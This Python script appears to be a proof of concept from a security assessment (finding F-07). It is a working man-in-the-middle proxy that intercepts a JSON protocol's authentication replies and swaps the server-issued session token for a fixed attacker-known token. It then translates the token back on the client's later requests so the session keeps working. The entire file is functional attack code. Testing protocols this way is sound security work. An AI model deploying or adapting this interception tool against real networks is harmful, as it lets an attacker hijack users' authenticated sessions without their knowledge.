#!/usr/bin/env python3
"""
mitm_F07.py - Session Token Fixation
Finding: F-07
Violated: R8, R12
The MITM intercepts the AUTH response and replaces the server-issued token
with an attacker-chosen token. It also injects a corresponding session into
the server using the real token obtained earlier. This causes the client to
use an attacker-known token for all subsequent requests.
"""

import socket
import threading
import json

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9000
SERVER_HOST  = "10.0.0.3"
SERVER_PORT  = 9000

FIXED_TOKEN = "aaaa-bbbb-cccc-dddd-eeee-ffff-0000"

real_token_store = {}   # username -> real server token
last_user = [None]


def forward(src, dst, label, transform=None):
    buf = b""
    try:
        while True:
            chunk = src.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                try:
                    obj = json.loads(line.decode("utf-8"))
                    if transform:
                        obj = transform(obj, label)
                    line = json.dumps(obj).encode("utf-8")
                except Exception:
                    pass
                dst.sendall(line + b"\n")
    except Exception:
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def tamper(obj, label):
    # Track who is logging in
    if label == "C->S" and obj.get("action") == "AUTH":
        last_user[0] = obj.get("username")

    # Replace token in AUTH response with fixed token
    if label == "S->C" and obj.get("status") == "ok" and "token" in obj:
        real_token = obj["token"]
        if real_token != "account created" and last_user[0]:
            real_token_store[last_user[0]] = real_token
            obj["token"] = FIXED_TOKEN
            print(f"\n[F-07 FIXATE] Real token  : {real_token}")
            print(f"[F-07 FIXATE] Fixed token : {FIXED_TOKEN}")
            print(f"[F-07 FIXATE] Client will now use attacker-known token\n")

    # When client sends requests using fixed token, swap back to real token
    if label == "C->S" and obj.get("token") == FIXED_TOKEN:
        username = last_user[0]
        real = real_token_store.get(username)
        if real:
            obj["token"] = real

    return obj


def handle_connection(client_sock, client_addr):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((SERVER_HOST, SERVER_PORT))
    except Exception as e:
        print(f"[MITM] Cannot connect to server: {e}")
        client_sock.close()
        return

    t1 = threading.Thread(target=forward, args=(client_sock, server_sock, "C->S", tamper), daemon=True)
    t2 = threading.Thread(target=forward, args=(server_sock, client_sock, "S->C", tamper), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[F-07] Token fixation active...")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_connection, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
